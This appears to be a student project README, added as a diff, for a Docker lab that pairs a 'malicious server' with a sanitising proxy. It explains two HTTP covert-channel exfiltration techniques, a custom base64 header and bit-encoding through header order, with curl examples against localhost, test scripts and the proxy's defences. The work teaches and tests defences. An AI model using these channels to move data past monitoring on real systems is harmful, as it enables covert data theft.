@@ -1,0 +1,302 @@
+# HTTP Data Leak — Proxy & Malicious Server
+
+This project demonstrates two HTTP-based covert channel data exfiltration techniques, alongside a proxy that detects and neutralizes them. It is implemented as a pair of Docker containers managed via Docker Compose.
+
+---
+
+## Architecture
+
+```
+[Client / Attacker]
+        |
+        | :8000
+        v
+  [ Proxy Server ]   <-- inspects and sanitizes PUT requests
+        |
+        | :8001 (internal)
+        v
+  [ Malicious Server ]  <-- receives and stores leaked data
+```
+
+- **Proxy** (port `8000`): transparently forwards all traffic to the malicious server, sanitizing PUT requests on registered entrypoints to neutralize data leaks.
+- **Malicious Server** (port `8001`): receives, stores, and exposes leaked data via a simple REST API.
+
+---
+
+## Requirements
+
+- [Docker](https://docs.docker.com/get-docker/)
+- [Docker Compose](https://docs.docker.com/compose/install/)
+- `curl` (for testing)
+- `bash` (for the test scripts)
+
+---
+
+## Running the Project
+
+### 1. Clone / extract the project
+
+```bash
+unzip progetto_dataleak.zip
+cd progetto_dataleak
+```
+
+### 2. Build and start the containers
+
+```bash
+docker compose up --build
+```
+
+This will:
+- Build and start the **proxy** container, listening on `localhost:8000`
+- Build and start the **malicious server** container, listening on `localhost:8001`
+
+To run in the background:
+
+```bash
+docker compose up --build -d
+```
+
+To stop:
+
+```bash
+docker compose down
+```
+
+---
+
+## Running Without Docker
+
+Both services can also be run directly with Python (3.10+), without Docker.
+
+### Start the malicious server
+
+```bash
+cd server
+python server.py
+```
+
+### Start the proxy (in a separate terminal)
+
+```bash
+cd proxy
+SERVER_HOST=localhost SERVER_PORT=8001 python proxy.py
+```
+
+---
+
+## API Reference
+
+### `POST /setup`
+Registers a new entrypoint and associates a leak type to it.
+
+```bash
+curl -X POST http://localhost:8000/setup \
+  -H "Content-Type: application/json" \
+  -d '{"entrypoint": "myleak", "type": "dedicatedheader"}'
+```
+
+**Parameters:**
+- `entrypoint` (string): the URL path to register (e.g. `"myleak"` → `/myleak`)
+- `type` (string): the leak technique — `dedicatedheader` or `headersorder`
+
+---
+
+### `PUT /<entrypoint>`
+Sends leaked data to a registered entrypoint.
+
+```bash
+curl -X PUT http://localhost:8000/myleak \
+  -H "X-dataleak: Y2lhbw=="
+```
+
+PUT requests on registered entrypoints are intercepted and sanitized by the proxy.
+
+---
+
+### `GET /<entrypoint>`
+Retrieves the data collected by the malicious server for a given entrypoint.
+
+```bash
+curl -X GET http://localhost:8001/myleak
+```
+
+---
+
+### `DELETE /clear`
+Resets all server state (configs, leaked data, bit buffers). Always hits port `8001` directly.
+
+```bash
+curl -X DELETE http://localhost:8001/clear
+```
+
+---
+
+## Implemented Leak Techniques
+
+### 1. Dedicated Header (`dedicatedheader`)
+Data is transmitted in a custom HTTP header `X-dataleak`, carrying a base64-encoded payload.
+
+**Example request:**
+```
+PUT /myleak HTTP/1.1
+Host: localhost
+X-dataleak: Y2lhbw==
+```
+
+**Proxy defense:** strips any header whose name is not in a whitelist of standard HTTP headers, blocking `X-dataleak` and any other non-standard header.
+
+---
+
+### 2. Headers Order (`headersorder`)
+Data is encoded as a sequence of bits across multiple HTTP requests. Each request encodes one bit by the relative order of two headers (`Header-A` and `Header-B`):
+
+- `Header-A` before `Header-B` → bit `0`
+- `Header-B` before `Header-A` → bit `1`
+
+Every 8 bits form one ASCII character (base64-encoded). A sequence of eight `0` bits signals end of string.
+
+**Example (sending bit `0`):**
+```
+PUT /myleak HTTP/1.1
+Host: localhost
+Header-A: 1
+Header-B: 1
+```
+
+**Proxy defense:** randomly shuffles all headers except the first (`Host`), destroying the ordering signal.
+
+---
+
+## Testing
+
+Three test scripts are provided. Make them executable first:
+
+```bash
+chmod +x test_complete.sh test_tec1.sh test_tec2.sh
+```
+
+### Full test suite
+
+```bash
+./test_complete.sh <PORT> <on|off>
+```
+
+| Command | Description |
+|---|---|
+| `./test_complete.sh 8000 on` | Both techniques through proxy with protection **enabled** |
+| `./test_complete.sh 8000 off` | Both techniques **bypassing** the proxy (direct to server) |
+| `./test_complete.sh 8001 on` | Both techniques hitting the server **directly** on port 8001 |
+
+### Individual technique tests
+
+```bash
+./test_tec1.sh <PORT>   # Dedicated Header only
+./test_tec2.sh <PORT>   # Headers Order only
+```
+
+### Expected results
+
+| Scenario | Technique 1 | Technique 2 |
+|---|---|---|
+| `8000 on` (proxy, protected) | ✅ Blocked | ✅ Neutralized (garbage) |
+| `8000 off` (proxy, unprotected) | ✅ Leaked | ✅ Leaked |
+| `8001 on/off` (direct server) | ✅ Leaked | ✅ Leaked |
+
+---
+
+## Extending the System
+
+The project is designed to make adding new leak techniques straightforward. Both the server and proxy use a plugin-style module system based on abstract base classes.
+
+### Step 1 — Implement the extractor (server side)
+
+Create `server/modules/my_technique.py`:
+
+```python
+from .base_module import DataLeakExtractor
+
+class MyTechniqueExtractor(DataLeakExtractor):
+    def extract(self, headers, entrypoint, leaked_data, bit_buffers):
+        # Read data from headers and store it in leaked_data[entrypoint]
+        pass
+```
+
+### Step 2 — Implement the sanitizer (proxy side)
+
+Create `proxy/modules/my_technique.py`:
+
+```python
+from .base_module import DataLeakSanitizer
+
+class MyTechniqueSanitizer(DataLeakSanitizer):
+    def sanitize(self, headers_list):
+        # Remove or alter headers to neutralize the leak
+        return headers_list
+```
+
+### Step 3 — Register the new technique
+
+In `server/server.py`, add to the `EXTRACTORS` dict:
+
+```python
+from modules.my_technique import MyTechniqueExtractor
+
+EXTRACTORS = {
+    "dedicatedheader": DedicatedHeaderExtractor(),
+    "headersorder":    HeadersOrderExtractor(),
+    "mytechnique":     MyTechniqueExtractor(),   # <-- add this
+}
+```
+
+In `proxy/proxy.py`, add to the `SANITIZERS` dict:
+
+```python
+from modules.my_technique import MyTechniqueSanitizer
+
+SANITIZERS = {
+    "dedicatedheader": DedicatedHeaderSanitizer(),
+    "headersorder":    HeadersOrderSanitizer(),
+    "mytechnique":     MyTechniqueSanitizer(),   # <-- add this
+}
+```
+
+No other changes are needed. The new technique is immediately available via `/setup` using `"type": "mytechnique"`.
+
+---
+
+## Project Structure
+
+```
+progetto_dataleak/
+├── docker-compose.yml
+├── proxy/
+│   ├── Dockerfile
+│   ├── proxy.py
+│   ├── requirements.txt
+│   └── modules/
+│       ├── base_module.py          # Abstract base class: DataLeakSanitizer
+│       ├── dedicated_header.py     # Strips X-dataleak and non-standard headers
+│       └── headers_order.py        # Randomly shuffles headers
+├── server/
+│   ├── Dockerfile
+│   ├── server.py
+│   ├── requirements.txt
+│   └── modules/
+│       ├── base_module.py          # Abstract base class: DataLeakExtractor
+│       ├── dedicated_header.py     # Reads X-dataleak header value
+│       └── headers_order.py        # Reconstructs bits from header ordering
+└── test_complete.sh                # Full test suite (both techniques)
+└── test_tec1.sh                    # Dedicated header test only
+└── test_tec2.sh                    # Headers order test only
+```
+
+---
+
+## Authors
+
+| Name | Surname | Student ID (Matricola) |
+|---|---|---|
+| Leonardo | Necordi | S5642683|
+| | | |
+| | | |
